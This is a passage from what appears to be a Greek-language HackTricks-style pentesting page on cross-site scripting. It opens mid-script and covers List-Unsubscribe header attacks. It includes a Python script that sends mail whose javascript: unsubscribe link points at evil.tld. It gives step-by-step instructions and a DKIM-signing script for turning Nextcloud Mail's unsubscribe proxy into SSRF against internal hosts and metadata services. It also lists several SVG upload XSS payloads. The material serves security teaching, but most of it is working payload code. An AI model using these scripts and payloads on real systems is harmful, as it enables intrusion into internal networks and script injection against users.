msg["List-Unsubscribe"] = "<javascript://evil.tld/%0aconfirm(document.domain)>"
msg["List-Unsubscribe-Post"] = "List-Unsubscribe=One-Click"

with smtplib.SMTP(smtp_server, smtp_port) as smtp:
smtp.starttls()
smtp.login(smtp_user, smtp_password)
smtp.send_message(msg)
```
</details>

#### Proxy απεγγραφής από την πλευρά του server -> SSRF

Ορισμένοι clients, όπως το Nextcloud Mail app, κάνουν proxy την ενέργεια απεγγραφής server-side: το πάτημα του κουμπιού δίνει εντολή στον server να κάνει fetch το παρεχόμενο URL ο ίδιος. Αυτό μετατρέπει την κεφαλίδα σε SSRF primitive, ειδικά όταν οι administrators ορίζουν `'allow_local_remote_servers' => true` (τεκμηριωμένο στο [HackerOne report 2902856](https://hackerone.com/reports/2902856)), που επιτρέπει requests προς loopback και RFC1918 ranges.

1. **Συντάξτε ένα email** όπου `List-Unsubscribe` στοχεύει σε attacker-controlled endpoint (για blind SSRF χρησιμοποιήστε Burp Collaborator / OAST).
2. **Κρατήστε `List-Unsubscribe-Post: List-Unsubscribe=One-Click`** ώστε το UI να εμφανίζει κουμπί απεγγραφής ενός κλικ.
3. **Ικανοποιήστε τις απαιτήσεις εμπιστοσύνης**: το Nextcloud, για παράδειγμα, πραγματοποιεί μόνο HTTPS unsubscribe requests όταν το μήνυμα περνά DKIM, οπότε ο attacker πρέπει να υπογράψει το email χρησιμοποιώντας domain που ελέγχει.
4. **Παραδώστε το μήνυμα σε mailbox που επεξεργάζεται ο target server** και περιμένετε μέχρι ένας χρήστης να πατήσει το κουμπί unsubscribe.
5. **Παρατηρήστε το server-side callback** στο collaborator endpoint, και μετά pivot σε internal addresses μόλις το primitive επιβεβαιωθεί.
```text
List-Unsubscribe: <http://abcdef.oastify.com>
List-Unsubscribe-Post: List-Unsubscribe=One-Click
```
<details>
<summary>Μήνυμα DKIM-signed List-Unsubscribe για δοκιμή SSRF</summary>
```python
#!/usr/bin/env python3
import smtplib
from email.message import EmailMessage
import dkim

smtp_server = "mail.example.org"
smtp_port = 587
smtp_user = "user@example.org"
smtp_password = "REDACTED"
dkim_selector = "default"
dkim_domain = "example.org"
dkim_private_key = """-----BEGIN PRIVATE KEY-----\n...\n-----END PRIVATE KEY-----"""

msg = EmailMessage()
msg.set_content("One-click unsubscribe test")
msg["From"] = "list@example.org"
msg["To"] = "victim@example.org"
msg["Subject"] = "Mailing list"
msg["List-Unsubscribe"] = "<http://abcdef.oastify.com>"
msg["List-Unsubscribe-Post"] = "List-Unsubscribe=One-Click"

raw = msg.as_bytes()
signature = dkim.sign(
message=raw,
selector=dkim_selector.encode(),
domain=dkim_domain.encode(),
privkey=dkim_private_key.encode(),
include_headers=["From", "To", "Subject"]
)
msg["DKIM-Signature"] = signature.decode().split(": ", 1)[1].replace("\r", "").replace("\n", "")

with smtplib.SMTP(smtp_server, smtp_port) as smtp:
smtp.starttls()
smtp.login(smtp_user, smtp_password)
smtp.send_message(msg)
```
</details>

**Σημειώσεις δοκιμών**

- Χρησιμοποιήστε ένα OAST endpoint για να συλλέξετε blind SSRF hits, και στη συνέχεια προσαρμόστε το URL `List-Unsubscribe` ώστε να στοχεύει `http://127.0.0.1:PORT`, υπηρεσίες μεταδεδομένων ή άλλους εσωτερικούς hosts μόλις το primitive επιβεβαιωθεί.
- Επειδή ο unsubscribe helper συχνά επαναχρησιμοποιεί την ίδια HTTP στοίβα με την εφαρμογή, κληρονομείτε τις ρυθμίσεις proxy της, τα HTTP verbs και τις επαναγραφές κεφαλίδων, επιτρέποντας περαιτέρω τεχνικές διάσχισης που περιγράφονται στη [SSRF methodology](../ssrf-server-side-request-forgery/README.md).

### XSS ανέβασμα αρχείων (svg)

Ανεβάστε ως εικόνα ένα αρχείο σαν το παρακάτω (από [http://ghostlulz.com/xss-svg/](http://ghostlulz.com/xss-svg/)):
```html
Content-Type: multipart/form-data; boundary=---------------------------232181429808
Content-Length: 574
-----------------------------232181429808
Content-Disposition: form-data; name="img"; filename="img.svg"
Content-Type: image/svg+xml

<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
<rect width="300" height="100" style="fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)" />
<script type="text/javascript">
alert(1);
</script>
</svg>
-----------------------------232181429808--
```

```html
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
<script type="text/javascript">alert("XSS")</script>
</svg>
```

```html
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
<polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
<script type="text/javascript">
alert("XSS");
</script>
</svg>
```

```svg
<svg width="500" height="500"
xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
<circle cx="50" cy="50" r="45" fill="green"
id="foo"/>

<foreignObject width="500" height="500">
<iframe xmlns="http://www.w3.org/1999/xhtml" src="data:text/html,&lt;body&gt;&lt;script&gt;document.body.style.background=&quot;red&quot;&lt;/script&gt;hi&lt;/body&gt;" width="400" height="250"/>
<iframe xmlns="http://www.w3.org/1999/xhtml" src="javascript:document.write('hi');" width="400" height="250"/>
</foreignObject>
</svg>
```

```html
<svg><use href="//portswigger-labs.net/use_element/upload.php#x" /></svg>
```

```xml
<svg><use href="data:image/svg+xml,&lt;svg id='x' xmlns='http://www.w3.org/2000/svg' &gt;&lt;image href='1' onerror='alert(1)' /&gt;&lt;/svg&gt;#x" />
```
Βρείτε **περισσότερα SVG payloads στο** [**https://github.com/allanlw/svg-cheatsheet**](https://github.com/allanlw/svg-cheatsheet)

## Διάφορα JS Κόλπα & Σχετικές Πληροφορίες


{{#ref}}
other-js-tricks.md
{{#endref}}

## XSS πόροι

- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20injection)
- [http://www.xss-payloads.com](http://www.xss-payloads.com) [https://github.com/Pgaijin66/XSS-Payloads/blob/master/payload.txt](https://github.com/Pgaijin66/XSS-Payloads/blob/master/payload.txt) [https://github.com/materaj/xss-list](https://github.com/materaj/xss-list)
- [https://github.com/ismailtasdelen/xss-payload-list](https://github.com/ismailtasdelen/xss-payload-list)
- [https://gist.github.com/rvrsh3ll/09a8b933291f9f98e8ec](https://gist.github.com/rvrsh3ll/09a8b933291f9f98e8ec)
- [https://netsec.expert/2020/02/01/xss-in-2020.html](https://netsec.expert/2020/02/01/xss-in-2020.html)
- [https://www.intigriti.com/researchers/blog/hacking-tools/hunting-for-blind-cross-site-scripting-xss-vulnerabilities-a-complete-guide](https://www.intigriti.com/researchers/blog/hacking-tools/hunting-for-blind-cross-site-scripting-xss-vulnerabilities-a-complete-guide)

## Αναφορές

- [Turning a harmless XSS behind a WAF into a realistic phishing vector](https://blog.hackcommander.com/posts/2025/12/28/turning-a-harmless-xss-behind-a-waf-into-a-realistic-phishing-vector/)
- [XSS and SSRF via the List-Unsubscribe SMTP Header in Horde Webmail and Nextcloud Mail](https://security.lauritz-holtmann.de/post/xss-ssrf-list-unsubscribe/)
- [HackerOne Report #2902856 - Nextcloud Mail List-Unsubscribe SSRF](https://hackerone.com/reports/2902856)
- [From "Low-Impact" RXSS to Credential Stealer: A JS-in-JS Walkthrough](https://r3verii.github.io/bugbounty/2025/08/25/rxss-credential-stealer.html)
- [MDN eval()](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/eval)

{{#include ../../banners/hacktricks-training.md}}
